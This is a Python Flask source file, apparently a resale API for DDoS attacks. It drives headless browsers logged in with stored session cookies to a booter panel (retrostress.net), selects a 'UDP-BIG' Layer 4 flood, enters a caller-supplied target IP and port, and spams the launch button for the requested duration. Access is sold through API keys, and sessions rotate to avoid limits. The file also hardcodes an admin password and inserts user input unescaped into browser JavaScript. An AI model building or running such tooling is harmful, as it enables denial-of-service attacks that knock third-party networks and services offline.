from flask import Flask, jsonify, request
from cloakbrowser import launch
import time
import threading
import json
import os
import secrets
import string
from datetime import datetime
import queue

app = Flask(__name__)

# ========== CONFIG ==========
METHOD            = "UDP-BIG"
ADMIN_PASSWORD    = "krishna"
PORT              = 3938
MAX_PRELOADED     = 5        # 4GB RAM ke liye 5 best hai
TOKEN_ROTATE_SEC  = 20
SPAM_SLEEP        = 0.01     # Fast Spam (100 CPS)

# ========== GLOBALS ==========
sessions             = []
sessions_lock        = threading.Lock()
active_attacks       = 0

api_keys             = {}
api_keys_file        = "api_keys.json"

attack_queue         = queue.Queue()

worker_pool          = []
worker_pool_lock     = threading.Lock()
workers_loading      = 0
workers_loading_lock = threading.Lock()

attack_counter       = 0
attack_counter_lock  = threading.Lock()

session_index        = 0
session_index_lock   = threading.Lock()

worker_counter       = 0
worker_counter_lock  = threading.Lock()

token_last_used      = {}
token_lock           = threading.Lock()

SS_FOLDER = "screenshots"
os.makedirs(SS_FOLDER, exist_ok=True)


# ========== LOAD/SAVE ==========
def load_api_keys():
    global api_keys
    if os.path.exists(api_keys_file):
        try:
            with open(api_keys_file, "r") as f:
                api_keys = json.load(f)
            print(f"✅ API Keys loaded: {len(api_keys)}")
        except Exception:
            api_keys = {}

def save_api_keys():
    with open(api_keys_file, "w") as f:
        json.dump(api_keys, f, indent=2)


def load_sessions():
    global sessions
    print("🔄 Loading sessions...")

    if not os.path.exists("retro_accounts.json"):
        print("❌ retro_accounts.json not found!")
        return False

    with open("retro_accounts.json", "r") as f:
        accounts = json.load(f)

    for account in accounts:
        session_num  = account["session_number"]
        session_file = f"retro_session_{session_num}.json"

        if os.path.exists(session_file):
            with open(session_file, "r") as f:
                cookies = json.load(f)
            sessions.append({
                "id":      session_num,
                "cookies": cookies,
            })
            token_last_used[session_num] = 0
            print(f"✅ Session {session_num} loaded")

    print(f"📊 Total sessions: {len(sessions)}")
    return len(sessions) > 0


# ========== TOKEN ROTATION ==========
def get_next_session_rotated():
    global session_index
    now = time.time()

    with token_lock:
        available = []
        for s in sessions:
            last = token_last_used.get(s["id"], 0)
            if now - last >= TOKEN_ROTATE_SEC:
                available.append(s)

        if not available:
            sorted_sessions = sorted(sessions, key=lambda s: token_last_used.get(s["id"], 0))
            session = sorted_sessions[0]
        else:
            session = available[session_index % len(available)]
            session_index += 1

        token_last_used[session["id"]] = now
        return session


# ========== SLOT MANAGEMENT ==========
def get_available_slots():
    return len(sessions) - sum(1 for k in api_keys.values() if k.get("active"))

def generate_api_key():
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))

def check_password(req):
    return (req.args.get('password') or req.headers.get('X-Password')) == ADMIN_PASSWORD


# ========== SCREENSHOT ==========
def take_screenshot(page, name):
    try:
        page.screenshot(path=os.path.join(SS_FOLDER, name), full_page=False)
    except Exception:
        pass


# ========== FAST METHOD SELECT ==========
def select_method(page, worker_number):
    for retry in range(3):
        try:
            # Layer 4
            page.evaluate("""() => {
                const b = document.querySelectorAll('button');
                for (const x of b) {
                    const t = x.innerText || x.textContent || '';
                    if (t.includes('Network endpoint') || t.includes('Layer 4')) { x.click(); return; }
                }
            }""")
            time.sleep(0.5)

            # Browse
            page.evaluate("""() => {
                const s = document.querySelector('span.app-method-trigger-action');
                if (s) { s.click(); return; }
                const all = document.querySelectorAll('span');
                for (const x of all) {
                    if (x.innerText && x.innerText.includes('Browse methods')) { x.click(); return; }
                }
            }""")
            time.sleep(1.5)

            # UDP
            page.evaluate("""() => {
                const b = document.querySelectorAll('button');
                for (const x of b) {
                    if ((x.innerText || '').trim() === 'UDP') { x.click(); return; }
                }
            }""")
            time.sleep(1)

            # UDP-BIG
            clicked = page.evaluate("""() => {
                const opts = document.querySelectorAll('button[role="option"]');
                for (const o of opts) {
                    const s = o.querySelector('strong');
                    if (s && s.textContent.trim() === 'UDP-BIG') { o.click(); return true; }
                }
                return false;
            }""")
            if clicked:
                return True
        except Exception:
            time.sleep(1)
    return False


# ========== PERSISTENT WORKER ==========
def worker_thread(worker_number):
    global active_attacks, workers_loading, attack_counter

    browser = None
    page = None
    
    while True:  # ⚡ Worker marta nahi, loop chalta rehta hai
        job = None
        loading_decreased = False
        session = get_next_session_rotated()
        
        try:
            print(f"[Worker-{worker_number}] 🌐 Session {session['id']} | Opening...")

            browser = launch(
                headless=True,
                args=['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', 
                      '--single-process', '--no-zygote', '--disable-extensions']
            )
            page = browser.new_page()
            page.set_viewport_size({"width": 1280, "height": 720})
            page.context.add_cookies(session["cookies"])

            # ⚡ FAST LOAD
            page.goto("https://retrostress.net/panel", wait_until="domcontentloaded", timeout=60000)
            time.sleep(2)

            if "auth" in page.url or "login" in page.url:
                print(f"[Worker-{worker_number}] ❌ Session expired!")
                browser.close()
                continue

            if not select_method(page, worker_number):
                print(f"[Worker-{worker_number}] ❌ Method failed")
                browser.close()
                continue

            print(f"[Worker-{worker_number}] ✅ Ready! Waiting for job...")

            # Pool me wapas daalo
            with workers_loading_lock:
                if workers_loading > 0:
                    workers_loading -= 1
                loading_decreased = True

            with worker_pool_lock:
                if len(worker_pool) < MAX_PRELOADED:
                    worker_pool.append(worker_number)

            # ⚡ WAIT FOR JOB (30 sec timeout)
            try:
                job = attack_queue.get(timeout=30)
            except queue.Empty:
                print(f"[Worker-{worker_number}] 💤 Idle timeout. Restarting browser...")
                browser.close()
                continue

            with worker_pool_lock:
                if worker_number in worker_pool:
                    worker_pool.remove(worker_number)

            target_ip = job["ip"]
            port = job["port"]
            duration = job["duration"]

            with attack_counter_lock:
                attack_counter += 1
                atk_num = attack_counter

            print(f"[Worker-{worker_number}] 🎯 ATK-{atk_num} | {target_ip}:{port} | {duration}s")

            # Fill IP & Port
            page.evaluate(f"""() => {{
                const el = document.querySelector('input#test-url');
                if (el) {{ el.value = '{target_ip}'; el.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
                const p = document.querySelector('input[aria-label="port"]');
                if (p) {{ p.value = '{port}'; p.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
            }}""")
            time.sleep(0.2)

            # ⚡ SPAM (Start test + Try again)
            spam_duration = max(duration - 1, 1)
            start_time = time.time()
            click_count = 0

            while time.time() - start_time < spam_duration:
                try:
                    result = page.evaluate("""() => {
                        let sc = 0, rc = 0;
                        const btns = document.querySelectorAll('button');
                        for (const btn of btns) {
                            const t = (btn.innerText || btn.textContent || '').trim().toLowerCase();
                            if (t.includes('start test')) { btn.click(); sc++; }
                            else if (t.includes('try again')) { btn.click(); rc++; }
                        }
                        return { start: sc, retry: rc };
                    }""")
                    click_count += (result.get('start', 0) + result.get('retry', 0))
                    
                    if click_count % 200 == 0 and click_count > 0:
                        cps = int(click_count / max(time.time() - start_time, 1))
                        print(f"[Worker-{worker_number}] ⚡ {click_count} | {cps}/s")
                    time.sleep(SPAM_SLEEP)
                except:
                    time.sleep(SPAM_SLEEP)

            print(f"[Worker-{worker_number}] ✅ DONE! {click_count} clicks")
            
            # Attack ke baad panel reset
            try:
                page.reload(wait_until="domcontentloaded")
                time.sleep(1)
            except:
                pass

        except Exception as e:
            print(f"[Worker-{worker_number}] ❌ Error: {e}")
        
        finally:
            if not loading_decreased:
                with workers_loading_lock:
                    if workers_loading > 0:
                        workers_loading -= 1
            if job:
                with sessions_lock:
                    active_attacks -= 1
            
            # Agar browser crash ho gaya to close karo
            if browser:
                try:
                    browser.close()
                except:
                    pass
            time.sleep(1) # Loop dobara start hone se pehle 1 sec wait


# ========== POOL MANAGER ==========
def pool_manager():
    global workers_loading, worker_counter
    while True:
        try:
            with worker_pool_lock:
                pool_size = len(worker_pool)
            with workers_loading_lock:
                loading = workers_loading
            
            needed = MAX_PRELOADED - (pool_size + loading)
            if needed > 0:
                for _ in range(needed):
                    with workers_loading_lock:
                        workers_loading += 1
                    with worker_counter_lock:
                        worker_counter += 1
                        worker_num = worker_counter
                    t = threading.Thread(target=worker_thread, args=(worker_num,), daemon=True)
                    t.start()
                    time.sleep(0.5)
        except Exception as e:
            print(f"[Pool] ❌ {e}")
        time.sleep(2)


# ========== ROUTES ==========
@app.route('/admin/generate_key', methods=['GET'])
def generate_key():
    if not check_password(request):
        return jsonify({"status": "error", "message": "❌ Wrong password!"}), 403
    slots = int(request.args.get('slots', 1))
    if slots > get_available_slots():
        return jsonify({"status": "error", "available_slots": get_available_slots()}), 400
    
    new_key = generate_api_key()
    api_keys[new_key] = {"slots": slots, "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "active": True}
    save_api_keys()
    return jsonify({"status": "success", "api_key": new_key, "slots": slots})

@app.route('/admin/list_keys', methods=['GET'])
def list_keys():
    if not check_password(request): return jsonify({"status": "error"}), 403
    return jsonify({"status": "success", "keys": list(api_keys.keys())})

@app.route('/attack/<ip>/<int:port>/<int:time_sec>', methods=['GET'])
def attack_url(ip, port, time_sec):
    global active_attacks
    api_key = request.args.get('key') or request.headers.get('X-API-Key')
    if not api_key or api_key not in api_keys or not api_keys[api_key]["active"]:
        return jsonify({"status": "error", "message": "❌ Invalid Key"}), 403

    with worker_pool_lock:
        pool_size = len(worker_pool)
    if pool_size == 0:
        return jsonify({"status": "error", "message": "❌ No workers ready, try in 10s"}), 429

    with sessions_lock:
        active_attacks += 1
        attack_id = active_attacks

    attack_queue.put({"ip": ip, "port": port, "duration": time_sec, "attack_id": attack_id})
    
    return jsonify({
        "status": "success", "message": "🚀 Launched!",
        "attack_id": attack_id, "target": f"{ip}:{port}",
        "duration": f"{time_sec}s", "pool_ready": pool_size
    })

@app.route('/status', methods=['GET'])
def status():
    with worker_pool_lock: pool_size = len(worker_pool)
    with workers_loading_lock: loading = workers_loading
    return jsonify({
        "status": "🟢 Online", "pool_ready": pool_size,
        "pool_loading": loading, "max_pool": MAX_PRELOADED,
        "active_attacks": active_attacks
    })

# ========== MAIN ==========
if __name__ == '__main__':
    print("=" * 60)
    print("⚡ KRISHNA ULTRA FAST API — Persistent Workers")
    print("=" * 60)

    load_api_keys()
    if not load_sessions():
        exit(1)

    threading.Thread(target=pool_manager, daemon=True).start()
    print("🚀 Pool manager started. API Ready!")
    
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)